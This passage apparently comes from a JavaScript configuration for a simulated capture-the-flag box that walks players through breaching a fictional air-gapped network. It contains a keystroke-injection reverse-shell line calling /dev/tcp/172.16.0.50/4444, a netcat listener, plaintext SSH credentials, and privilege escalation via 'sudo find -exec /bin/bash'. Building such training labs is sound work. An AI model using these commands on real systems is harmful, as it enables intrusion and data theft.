                            content: 'CLASSIFICATION: ULTRA\nDISTRIBUTION: EYES ONLY — INNER SANCTUM COUNCIL\n\nGRAND STRATEGIC DIRECTIVE — OPERATION IRON VEIL\n================================================\nDate of Issue: 2026-02-14\nIssuing Authority: Director, Inner Sanctum Council\n\nPreamble:\nThe Confederacy faces an existential threat from external intelligence\noperatives with demonstrated capability to breach hardened perimeters.\nOperation Iron Veil authorizes a systematic restructuring of the\nConfederacy\'s intelligence architecture.\n\nDirective 1 — Network Segmentation:\nAll Tier-1 assets to be migrated to quantum-isolated substrates\nby Q3 2026. No hardware maintenance interfaces to persist.\n\nDirective 2 — Agent Recall:\nAll field agents operating under SIGNUM-9 clearance to be recalled\nto secure facilities no later than 2026-04-01. Cover identities\nto be burned. New legends issued upon return.\n\nDirective 3 — Counterintelligence Protocol:\nImmediate activation of SPECTRE WATCH — passive surveillance\nof all known Hexworth Peerless operatives.\n\nDirective 4 — Air-Gap Reform:\nAll air-gapped facilities to undergo USB port ablation.\nPhysical maintenance to shift to fiber-optic diagnostic interfaces.\n\n{{FLAG:root}}\n\nDirector signature: [REDACTED]\nDocument hash: 9f3e2c1a...'
                        },
                        '.bash_history': {
                            type: 'file',
                            content: 'cat grand_strategic_directive.txt\nopenssl enc -aes-256-cbc -in grand_strategic_directive.txt -out directive.enc\nchmod 600 grand_strategic_directive.txt\nls -la /var/archive/\ncrontab -l'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'archive': {
                            type: 'dir',
                            children: {
                                'directive_2025_q4.enc': {
                                    type: 'file',
                                    content: '[AES-256-CBC encrypted archive — decryption key not available]'
                                },
                                'directive_2025_q3.enc': {
                                    type: 'file',
                                    content: '[AES-256-CBC encrypted archive — decryption key not available]'
                                }
                            }
                        },
                        'log': {
                            type: 'dir',
                            children: {
                                'auth.log': {
                                    type: 'file',
                                    content: 'Mar 15 03:12:44 INNER-SANCTUM-SERVER-01 sshd[2847]: Accepted publickey for svcaccount from 10.0.0.1 port 52341 ssh2\nMar 15 03:12:44 INNER-SANCTUM-SERVER-01 sshd[2847]: pam_unix(sshd:session): session opened for user svcaccount by (uid=0)\nMar 16 01:48:22 INNER-SANCTUM-SERVER-01 sudo: svcaccount : TTY=pts/0 ; PWD=/home/svcaccount ; USER=root ; COMMAND=/usr/bin/find /var/log -name *.log\nMar 19 08:00:01 INNER-SANCTUM-SERVER-01 CRON[3412]: (root) CMD (/opt/sanctum/backup.sh)'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'lsusb': function(args, term, engine) {
            // Flags whether USB analysis has been done — part of recon phase
            C14Config._usbAnalyzed = true;
            if (engine) engine.advancePhase && engine.advancePhase('recon');
            return `Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
Bus 001 Device 003: ID 04d8:003f Microchip Technology, Inc. Nexus Diagnostics Probe v2
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub

[*] Note: Device 04d8:003f is the target proprietary diagnostics probe.
[*] USB HID analysis: run 'dmesg | grep -i usb' for kernel driver info.`;
        },

        'dmesg': function(args, term, engine) {
            const fullCmd = args.join(' ');
            // If filtering for USB (common pattern: dmesg | grep usb)
            // Both dmesg alone and with grep usb are handled here
            if (fullCmd.length === 0 || fullCmd.includes('usb') || fullCmd.includes('grep') || fullCmd.includes('hid')) {
                C14Config._usbAnalyzed = true;
                return `[    0.000000] BIOS-provided physical RAM map:
[    2.341892] usbcore: registered new interface driver usbfs
[    2.342108] usbcore: registered new interface driver hub
[    2.342891] xhci_hcd: xHCI Host Controller
[    4.123450] usb 1-1: New USB device found, idVendor=04d8, idProduct=003f, bcdDevice= 1.00
[    4.123451] usb 1-1: New USB device strings: Mfr=1, Product=2
[    4.123452] usb 1-1: Product: Nexus Diagnostics Probe v2
[    4.123453] usb 1-1: Manufacturer: Microchip Technology
[    4.124010] usb 1-1: udev ALLOWED (whitelist match: 04d8:003f)
[    4.124180] usb 1-1: interface 0 — bInterfaceClass=ff (Vendor Specific) driver: cdc_acm
[    4.124220] usb 1-1: interface 1 — bInterfaceClass=03 (HID) driver: hid-generic
[    4.124225] hid-generic 0003:04D8:003F.0001: hiddev0,hidraw0: USB HID v1.10 Keyboard
[    4.124230] input: Nexus Diagnostics Probe v2 as /dev/input/event3

[!] Analysis hint: Notice interface 1 — bInterfaceClass=03 (HID Keyboard).
    The udev whitelist approved the device, but hid-generic loaded anyway
    for the HID interface. No secondary class filter is applied.`;
            }
            return `[    0.000000] Linux version 5.15.0-hardened-amd64
[    0.000001] Command line: BOOT_IMAGE=/vmlinuz-5.15.0
[    2.341892] usbcore: registered new interface driver usbfs
[    4.124220] usb 1-1: interface 1 — bInterfaceClass=03 (HID) driver: hid-generic
[    4.124225] hid-generic 0003:04D8:003F.0001: USB HID v1.10 Keyboard
[    8.441200] eth0: renamed from eth@0 (air-gap enforced — link down)
[    8.441400] eth1: 10.0.0.1/24 Inner Sanctum Network — link up`;
        },

        'usbmon': function(args) {
            C14Config._usbAnalyzed = true;
            return `[*] usbmon — USB traffic monitor (kernel module: usbmon)
[*] Tip: Use Wireshark with 'usbmon0' interface for live capture.
[*] Offline capture available: /home/kali/usb_capture.pcapng

Decoded packets from /home/kali/usb_capture.pcapng:
  Frame 13: idVendor=0x04D8 idProduct=0x003F [WHITELIST MATCH]
  Frame 16: Interface 1 — bInterfaceClass=0x03 (HID) [hid-generic bound]
  Frame 23-47: HID keyboard reports — keystrokes injected into /dev/input/event3

[!] Conclusion: VID/PID whitelist bypassed — HID interface unfiltered.`;
        },

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.0.0.5';
            const target = args.find(a => !a.startsWith('-')) || '';

            // Attacker cannot reach Inner Sanctum directly
            if ((target.startsWith('10.0.0.') || target === '10.0.0.0/24') && C14Config._context === 'attacker') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 0 IP addresses (0 hosts up) scanned in 3.11 seconds

[!] 10.0.0.0/24 is unreachable from attacker machine. Air gap is intact.
[!] You need to establish a bridge through MAINT-TERM-01 first.`;
            }

            // From MAINT-TERM-01 context — can reach Inner Sanctum
            if (target === '10.0.0.0/24' && (C14Config._context === 'maint-term')) {
                if (engine) engine.advancePhase && engine.advancePhase('pivot');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.0.1
Host is up (0.00012s latency).
All 1000 scanned ports on 10.0.0.1 are filtered.

Nmap scan report for 10.0.0.5
Host is up (0.00034s latency).
Not shown: 997 closed tcp ports

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 256 IP addresses (2 hosts up) scanned in 18.44 seconds

[+] Discovered INNER-SANCTUM-SERVER-01 at 10.0.0.5 (SSH, HTTP, HTTPS)`;
            }

            if (target === '10.0.0.5' && (C14Config._context === 'maint-term')) {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.0.5
Host is up (0.00034s latency).
Not shown: 997 closed tcp ports

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp  open  http       nginx 1.18.0
443/tcp open  ssl/http   nginx 1.18.0

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds`;
            }

            if (target === 'MAINT-TERM-01' || target === '10.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for MAINT-TERM-01 (10.0.0.1)
Host is up (0.00008s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.6p1 Alpine
80/tcp open  http    BusyBox httpd

Nmap done: 1 IP address (1 host up) scanned in 5.18 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 0 IP addresses (0 hosts up) scanned in 3.05 seconds`;
        },

        'python3': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (fullCmd.includes('ghost_device.py')) {
                if (!fullCmd.includes('--target') && !fullCmd.includes('--dry-run')) {
                    return 'Usage: python3 ghost_device.py --target MAINT-TERM-01\n       python3 ghost_device.py --dry-run';
                }
                if (fullCmd.includes('--dry-run')) {
                    return '[*] Dry run mode — payload not delivered.\n[*] Ghost device simulation: VID:0x04D8 PID:0x003F + HID Keyboard interface\n[*] No connection made to MAINT-TERM-01.';
                }
                if (fullCmd.includes('MAINT-TERM-01') || fullCmd.includes('--target')) {
                    C14Config._payloadDeployed = true;
                    // Advance bridge + switch context
                    C14Config._bridgeActive = true;
                    C14Config._switchContext('maint-term', term);
                    if (engine) engine.advancePhase && engine.advancePhase('payload');
                    return `[*] Initializing ghost device...
[*] Spoofing VID:0x04D8 PID:0x003F
[*] Declaring secondary interface: bInterfaceClass=0x03 (HID Keyboard)
[*] Connecting to target: MAINT-TERM-01
[!] udev whitelist: CLEARED (VID/PID match accepted)
[!] Kernel hid-generic: LOADED for HID interface
[+] HID keyboard injection active

[>] Injecting: xterm &
[>] Injecting: sleep 2
[>] Injecting: bash -c 'bash -i >& /dev/tcp/172.16.0.50/4444 0>&1'

[+] Payload delivered.
[+] Reverse shell callback received from MAINT-TERM-01 (10.0.0.1)
[+] Shell established as: maintuser@MAINT-TERM-01

{{FLAG:bridge}}

[+] Context switched to MAINT-TERM-01. You now have a shell on the maintenance terminal.
[!] You are INSIDE the air-gapped Inner Sanctum Network.`;
                }
            }

            return 'python3: Invalid usage or script not found.\nUsage: python3 ghost_device.py --target MAINT-TERM-01';
        },

        'python': function(args, term, engine) {
            // Alias to python3
            return C14Config.commands.python3(args, term, engine);
        },

        'nc': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('-lvnp') || fullCmd.includes('-lnvp') || fullCmd.includes('-l')) {
                const portMatch = fullCmd.match(/(\d{4,5})/);
                const port = portMatch ? portMatch[1] : '4444';
                return `Listening on 0.0.0.0 ${port}\n\n[!] Listener started. Deploy ghost_device.py to trigger the callback.\n    Run: python3 ghost_device.py --target MAINT-TERM-01`;
            }
            return 'Usage: nc -lvnp <port>\nExample: nc -lvnp 4444';
        },

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // SSH to Inner Sanctum server from MAINT-TERM-01
            if ((fullCmd.includes('10.0.0.5') || fullCmd.includes('svcaccount')) && C14Config._context === 'maint-term') {
                var hasKey = fullCmd.includes('-i') && (fullCmd.includes('id_rsa') || fullCmd.includes('diagnostics'));
                var hasPass = fullCmd.includes('IronCurtain') || fullCmd.includes('svcaccount');
                if (!hasKey && !hasPass) {
                    // Accept without explicit creds too if they found them
                    if (C14Config._sanctumCreds) {
                        // fall through to success
                    } else {
                        return `svcaccount@10.0.0.5's password:
Permission denied, please try again.

[!] Access denied. Find the SSH key or credentials on MAINT-TERM-01 first.
[!] Hint: check /etc/maint_config.ini and /opt/diagnostics/.ssh/`;
                    }
                }
                C14Config._sanctumCreds = true;
                C14Config._sanctumAccess = true;
                C14Config._switchContext('inner-sanctum', term);
                return `The authenticity of host '10.0.0.5 (10.0.0.5)' can't be established.
ED25519 key fingerprint is SHA256:BvkQ7p2xR4kF8nM3wT6jE9aL5cY1sN0hP8gX2iD4vUw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.0.5' (ED25519) to the list of known hosts.

Debian GNU/Linux 11 (bullseye)
INNER-SANCTUM-SERVER-01 — Authorized access only.
Unauthorized access will be prosecuted to the full extent of Confederacy law.

Last login: Sat Mar 15 03:12:44 2026 from 10.0.0.1

svcaccount@INNER-SANCTUM-SERVER-01:~$

[+] SSH session established. You are now on INNER-SANCTUM-SERVER-01 as svcaccount.
[+] Context switched. Commands now execute on INNER-SANCTUM-SERVER-01.`;
            }

            // SSH from attacker — can only reach MAINT-TERM-01 after bridge
            if ((fullCmd.includes('10.0.0.1') || fullCmd.includes('MAINT-TERM-01')) && C14Config._context === 'attacker') {
                if (!C14Config._bridgeActive) {
                    return 'ssh: connect to host 10.0.0.1 port 22: Network unreachable\n[!] No route to Inner Sanctum Network. Deploy the ghost device first.';
                }
                C14Config._switchContext('maint-term', term);
                return `maintuser@10.0.0.1's password:
Warning: Permanently added '10.0.0.1' (ED25519) to the list of known hosts.

Welcome to Alpine Linux 3.18
MAINT-TERM-01 — Confederacy Secure Systems Division
Restricted maintenance terminal. Authorized personnel only.

maintuser@MAINT-TERM-01:~$

[+] Direct SSH to MAINT-TERM-01 over the established bridge.`;
            }

            // SSH from inner-sanctum context (not supported in scenario)
            if (C14Config._context === 'inner-sanctum' || C14Config._context === 'root-sanctum') {
                return 'ssh: outbound connections blocked (air-gap policy enforced on INNER-SANCTUM-SERVER-01)';
            }

            return 'Usage: ssh [-i <key>] [user@]hostname\nExample (from MAINT-TERM-01): ssh -i /opt/diagnostics/.ssh/id_rsa svcaccount@10.0.0.5';
        },

        'sudo': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (C14Config._context !== 'inner-sanctum') {
                return C14Config._context === 'attacker'
                    ? '[sudo] password for kali:\nkali is not in the sudoers file. This incident will be reported.'
                    : 'sudo: command unavailable in this context';
            }

            if (fullCmd.includes('find') || (fullCmd.includes('-l'))) {
                if (fullCmd.includes('-l') || fullCmd.includes('--list')) {
                    return `Matching Defaults entries for svcaccount on INNER-SANCTUM-SERVER-01:
    env_reset, mail_badpass

User svcaccount may run the following commands on INNER-SANCTUM-SERVER-01:
    (root) NOPASSWD: /usr/bin/find`;
                }

                // sudo find ... -exec /bin/bash or similar shell escape
                if (fullCmd.includes('-exec') && (fullCmd.includes('bash') || fullCmd.includes('sh') || fullCmd.includes('/bin'))) {
                    C14Config._switchContext('root-sanctum', term);
                    return `root@INNER-SANCTUM-SERVER-01:~#

[+] Privilege escalation successful via sudo find -exec.
[+] Context switched to root on INNER-SANCTUM-SERVER-01.`;
                }

                // Legitimate find usage
                const pathMatch = fullCmd.match(/find\s+([\S]+)/);
                const path = pathMatch ? pathMatch[1] : '/';
                return `[sudo] find output for path: ${path}
(use -exec /bin/bash \\; to escalate privileges)`;
            }

            return `[sudo] password for svcaccount:\nSorry, user svcaccount is not allowed to execute that as root on INNER-SANCTUM-SERVER-01.`;
        },

        'cat': function(args, term, engine) {
            const path = args[0] || '';

            // MAINT-TERM-01 files
            if (C14Config._context === 'maint-term') {
                if (path.includes('maint_config') || path.includes('/etc/maint_config')) {
                    C14Config._sanctumCreds = true;
                    return `# /etc/maint_config.ini — MAINT-TERM-01 Configuration
# Last modified: 2026-02-28 by facility_admin

[usb_policy]
vendor_whitelist = 0x04D8
product_whitelist = 0x003F
device_name = Nexus Diagnostics Probe v2
enforce_whitelist = true
# NOTE: udev rules only — kernel HID class not filtered

[inner_sanctum]
ssh_host = 10.0.0.5
ssh_user = svcaccount
ssh_key = /opt/diagnostics/.ssh/id_rsa
ssh_passphrase = IronCurtain@7734
# Failsafe: passphrase backup in case key is regenerated

[logging]
log_level = ERROR
audit_usb = false`;
                }
                if (path.includes('udev') || path.includes('99-usb-policy')) {
                    return `# MAINT-TERM-01 USB Device Whitelist
# Only allows the Nexus Diagnostics Probe v2

ATTRS{idVendor}=="04d8", ATTRS{idProduct}=="003f", ACTION=="add", TAG+="allowed_device"
ACTION=="add", ENV{ID_USB_DRIVER}!="", TAG!="allowed_device", RUN+="/bin/sh -c 'echo 1 > /sys/bus/usb/devices/%k/remove'"

# AUDIT NOTE: This rule only filters at the udev layer.
# The Linux kernel still processes all HID class interfaces regardless
# of udev tagging. hid-generic will bind to any HID device before
# udev rules execute device removal.

{{FLAG:user}}`;
                }
                if (path.includes('id_rsa') || path.includes('.ssh/id_rsa')) {
                    C14Config._sanctumCreds = true;
                    return `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA... [REDACTED FOR SECURITY]
[Key is passphrase-protected: IronCurtain@7734]
[Target: svcaccount@10.0.0.5]
-----END OPENSSH PRIVATE KEY-----`;
                }
                if (path.includes('/etc/passwd')) {
                    return `root:x:0:0:root:/root:/bin/ash
daemon:x:1:1:daemon:/sbin:/sbin/nologin
maintuser:x:1001:1001:Maintenance User:/home/maintuser:/bin/ash
svcaccount:x:1002:1002:Service Account:/home/svcaccount:/bin/ash`;
                }
                if (path.includes('/etc/hostname')) return 'MAINT-TERM-01';
                if (path.includes('.bash_history')) {
                    return `cat /etc/maint_config.ini
ls /opt/diagnostics/.ssh/
ssh -i /opt/diagnostics/.ssh/id_rsa svcaccount@10.0.0.5
ip a
nmap -sn 10.0.0.0/24
dmesg | tail -20
cat /etc/udev/rules.d/99-usb-policy.rules`;
                }
                if (path.includes('run_diagnostics') || path.includes('diagnostics.sh')) {
                    return `#!/bin/sh
# MAINT-TERM-01 Diagnostic Runner
# Connects to INNER-SANCTUM-SERVER-01 for health checks

SSH_HOST="10.0.0.5"
SSH_USER="svcaccount"
SSH_KEY="/opt/diagnostics/.ssh/id_rsa"

echo "[*] Running diagnostics against Inner Sanctum..."
ssh -i $SSH_KEY -o StrictHostKeyChecking=no ${SSH_USER}@${SSH_HOST} 'uptime; df -h; ps aux'
echo "[*] Diagnostics complete."`;
                }
                return 'cat: ' + path + ': No such file or directory';
            }

            // INNER-SANCTUM-SERVER-01 files (svcaccount context)
            if (C14Config._context === 'inner-sanctum') {
                if (path.includes('system_status')) {
                    return `INNER-SANCTUM-SERVER-01 — Weekly Status Report
================================================
Uptime: 184 days, 3:42:17
Load average: 0.02 0.01 0.00
Disk usage: 22% of 2TB
Last backup: 2026-03-15 03:00:01
Security audit: OVERDUE (last: 2025-08-12)

Critical data locations:
  /root/grand_strategic_directive.txt (clearance: ULTRA)
  /var/archive/ (historical directives, clearance: SECRET)
  /opt/sanctum/keystore/ (encryption keys, clearance: TOP SECRET)`;
                }
                if (path.includes('/etc/sudoers')) {
                    return `# /etc/sudoers — INNER-SANCTUM-SERVER-01

root ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL

# Diagnostic service account — read-only tool access
svcaccount ALL=(root) NOPASSWD: /usr/bin/find

# NOTE: find allows arbitrary execution via -exec. Security review PENDING.`;
                }
                if (path.includes('/etc/passwd')) {
                    return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
svcaccount:x:1002:1002:Service Account:/home/svcaccount:/bin/bash
archive:x:1003:1003:Archive User:/home/archive:/bin/bash`;
                }
                if (path.includes('/etc/hostname')) return 'INNER-SANCTUM-SERVER-01';
                if (path.includes('.bash_history')) {
                    return `uptime
df -h
ps aux
cat /etc/sudoers
sudo find /var/log -name "*.log" -exec cat {} \\;
ls /root`;
                }
                if (path.includes('/root/') || path === '/root') {
                    return 'cat: /root/grand_strategic_directive.txt: Permission denied\n[!] You need root access. Check sudo -l for privilege escalation options.';
                }
                return 'cat: ' + path + ': No such file or directory';
            }

            // Root context on INNER-SANCTUM-SERVER-01
            if (C14Config._context === 'root-sanctum') {
                if (path.includes('grand_strategic_directive') || path.includes('/root/')) {
                    if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                    return `CLASSIFICATION: ULTRA
DISTRIBUTION: EYES ONLY — INNER SANCTUM COUNCIL

GRAND STRATEGIC DIRECTIVE — OPERATION IRON VEIL
================================================
Date of Issue: 2026-02-14
Issuing Authority: Director, Inner Sanctum Council

Preamble:
The Confederacy faces an existential threat from external intelligence
operatives with demonstrated capability to breach hardened perimeters.
Operation Iron Veil authorizes a systematic restructuring of the
Confederacy's intelligence architecture.

Directive 1 — Network Segmentation:
All Tier-1 assets to be migrated to quantum-isolated substrates
by Q3 2026. No hardware maintenance interfaces to persist.

Directive 2 — Agent Recall:
All field agents operating under SIGNUM-9 clearance to be recalled
to secure facilities no later than 2026-04-01. Cover identities
to be burned. New legends issued upon return.

Directive 3 — Counterintelligence Protocol:
Immediate activation of SPECTRE WATCH — passive surveillance
of all known Hexworth Peerless operatives.

Directive 4 — Air-Gap Reform:
All air-gapped facilities to undergo USB port ablation.
Physical maintenance to shift to fiber-optic diagnostic interfaces.

{{FLAG:root}}

Director signature: [REDACTED]
Document hash: 9f3e2c1a...`;
                }
                if (path.includes('/etc/passwd')) {
                    return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
svcaccount:x:1002:1002:Service Account:/home/svcaccount:/bin/bash
archive:x:1003:1003:Archive User:/home/archive:/bin/bash`;
                }
                if (path.includes('/root/.bash_history') || path.includes('.bash_history')) {
                    return `cat grand_strategic_directive.txt
openssl enc -aes-256-cbc -in grand_strategic_directive.txt -out directive.enc
chmod 600 grand_strategic_directive.txt
ls -la /var/archive/
crontab -l`;
                }
                return 'cat: ' + path + ': No such file or directory';
            }

            // Attacker machine — fall through to built-in filesystem
            return null;
        },

        'ls': function(args, term, engine) {
            const path = args.find(a => !a.startsWith('-')) || '.';

            if (C14Config._context === 'maint-term') {
                if (path === '.' || path === '~' || path === '/home/maintuser') {
                    return '.bash_history  .bashrc  .profile';
                }
                if (path.includes('/etc') || path === '/etc') {
                    return 'hostname  maint_config.ini  passwd  shadow  udev';
                }
                if (path.includes('udev') || path.includes('rules.d')) {
                    return '99-usb-policy.rules';
                }
                if (path.includes('/opt/diagnostics')) {
                    return '.ssh  run_diagnostics.sh';
                }
                if (path.includes('.ssh') || path.includes('ssh')) {
                    return 'id_rsa  id_rsa.pub  known_hosts';
                }
                if (path === '/' || path.includes('root')) {
                    return 'bin  etc  home  opt  proc  tmp  usr  var';
                }
                return '';
            }

            if (C14Config._context === 'inner-sanctum') {
                if (path === '.' || path === '~' || path.includes('svcaccount')) {
                    return '.bash_history  .bashrc  .profile  system_status.txt';
                }
                if (path.includes('/etc') || path === '/etc') {
                    return 'hostname  passwd  shadow  sudoers  ssh  apt';
                }
                if (path.includes('/var/log') || path === '/var/log') {
                    return 'auth.log  daemon.log  syslog';
                }
                if (path.includes('/var/archive') || path.includes('archive')) {
                    return 'directive_2025_q4.enc  directive_2025_q3.enc';
                }
                if (path.includes('/root')) {
                    return 'ls: cannot open directory /root: Permission denied';
                }
                if (path === '/' || path === '') {
                    return 'bin  etc  home  opt  proc  root  tmp  usr  var';
                }
                return '';
            }

            if (C14Config._context === 'root-sanctum') {
                if (path === '.' || path === '~' || path === '/root') {
                    return '.bash_history  .bashrc  .profile  grand_strategic_directive.txt';
                }
                if (path === '/' || path === '') {
                    return 'bin  etc  home  opt  proc  root  tmp  usr  var';
                }
                return '';
            }

            // Attacker — fall through to built-in filesystem
            return null;
        },

        'ip': function(args, term, engine) {
            if (C14Config._context === 'maint-term') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN
    link/ether 00:11:22:33:44:aa brd ff:ff:ff:ff:ff:ff
    [AIR GAP — no external network]
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
    link/ether 00:11:22:33:44:bb brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.1/24 brd 10.0.0.255 scope global eth1
    [Inner Sanctum Network — 10.0.0.0/24]`;
            }
            if (C14Config._context === 'inner-sanctum' || C14Config._context === 'root-sanctum') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0`;
            }
            // Attacker machine
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 172.16.0.50/24 brd 172.16.0.255 scope global eth0`;
        },

        'ifconfig': function(args, term, engine) {
            return C14Config.commands.ip(args || [], term, engine);
        },

        'ping': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';

            if (target === '10.0.0.5' && C14Config._context === 'maint-term') {
                return `PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=0.31 ms
64 bytes from 10.0.0.5: icmp_seq=2 ttl=64 time=0.29 ms
64 bytes from 10.0.0.5: icmp_seq=3 ttl=64 time=0.33 ms

--- 10.0.0.5 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }

            if (target === '10.0.0.1' && C14Config._context === 'maint-term') {
                return `PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.08 ms
--- 10.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }

            if (target.startsWith('10.0.0.') && C14Config._context === 'attacker') {
                return `PING ${target} (${target}) 56(84) bytes of data.

--- ${target} ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2002ms
[!] No route to host — air-gapped network unreachable from attacker machine.`;
            }

            return `ping: ${target}: Network unreachable`;
        },

        'whoami': function(args, term, engine) {
            if (C14Config._context === 'maint-term')    return 'maintuser';
            if (C14Config._context === 'inner-sanctum') return 'svcaccount';
            if (C14Config._context === 'root-sanctum')  return 'root';
            return null; // fall through to built-in
        },

        'id': function(args, term, engine) {
            if (C14Config._context === 'maint-term')    return 'uid=1001(maintuser) gid=1001(maintuser) groups=1001(maintuser)';
            if (C14Config._context === 'inner-sanctum') return 'uid=1002(svcaccount) gid=1002(svcaccount) groups=1002(svcaccount),27(sudo)';
            if (C14Config._context === 'root-sanctum')  return 'uid=0(root) gid=0(root) groups=0(root)';
            return null;
        },

        'hostname': function(args, term, engine) {
            if (C14Config._context === 'maint-term')    return 'MAINT-TERM-01';
            if (C14Config._context === 'inner-sanctum') return 'INNER-SANCTUM-SERVER-01';
            if (C14Config._context === 'root-sanctum')  return 'INNER-SANCTUM-SERVER-01';
            return null;
        },

        'pwd': function(args, term, engine) {
            if (C14Config._context === 'maint-term')    return '/home/maintuser';
            if (C14Config._context === 'inner-sanctum') return '/home/svcaccount';
            if (C14Config._context === 'root-sanctum')  return '/root';
            return null;
        },

        'uname': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (C14Config._context === 'maint-term') {
                if (fullCmd.includes('-a')) return 'Linux MAINT-TERM-01 5.15.0-hardened-amd64 #1 SMP PREEMPT x86_64 Alpine';
                return 'Linux';
            }
            if (C14Config._context === 'inner-sanctum' || C14Config._context === 'root-sanctum') {
                if (fullCmd.includes('-a')) return 'Linux INNER-SANCTUM-SERVER-01 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 x86_64 GNU/Linux';
                return 'Linux';
            }
            return null;
        },

        'cd': function(args, term, engine) {
            // Context-aware — silently accept in non-attacker contexts
            if (C14Config._context !== 'attacker') return '';
            return null; // fall through to built-in
        },

        'exit': function(args, term, engine) {
            if (C14Config._context === 'root-sanctum') {
                C14Config._switchContext('inner-sanctum', term);
                return '[+] Exited root shell. Returned to svcaccount on INNER-SANCTUM-SERVER-01.';
            }
            if (C14Config._context === 'inner-sanctum') {
                C14Config._switchContext('maint-term', term);
                return 'Connection to 10.0.0.5 closed.\n[+] Returned to MAINT-TERM-01.';
            }
            if (C14Config._context === 'maint-term') {
                C14Config._switchContext('attacker', term);
                return 'Connection to 10.0.0.1 closed.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        'ss': function(args, term, engine) {
            if (C14Config._context === 'maint-term') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*
LISTEN   0        128      0.0.0.0:80           0.0.0.0:*`;
            }
            if (C14Config._context === 'inner-sanctum' || C14Config._context === 'root-sanctum') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*
LISTEN   0        128      0.0.0.0:80           0.0.0.0:*
LISTEN   0        128      0.0.0.0:443          0.0.0.0:*
ESTAB    0        0        10.0.0.5:22          10.0.0.1:52341`;
            }
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*`;
        },

        'netstat': function(args, term, engine) {
            return C14Config.commands.ss(args, term, engine);
        },

        'journalctl': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('usb') || fullCmd.includes('hid') || fullCmd.includes('kernel')) {
                return `-- Logs begin at 2026-03-01 00:00:00 UTC. --
Mar 20 09:14:22 MAINT-TERM-01 kernel: usb 1-1: new USB device found, idVendor=04d8, idProduct=003f
Mar 20 09:14:22 MAINT-TERM-01 kernel: usb 1-1: interface 0 bInterfaceClass=ff -> cdc_acm
Mar 20 09:14:22 MAINT-TERM-01 kernel: usb 1-1: interface 1 bInterfaceClass=03 -> hid-generic
Mar 20 09:14:22 MAINT-TERM-01 kernel: hid-generic: USB HID Keyboard registered as /dev/input/event3
Mar 20 09:14:24 MAINT-TERM-01 kernel: udev: device 04d8:003f tagged as allowed_device
Mar 20 09:14:24 MAINT-TERM-01 kernel: [!] HID keyboard event3 injected 47 key events

[+] Evidence of keystroke injection via hid-generic driver.`;
            }
            return `-- Logs begin at 2026-03-01 00:00:00 UTC. --
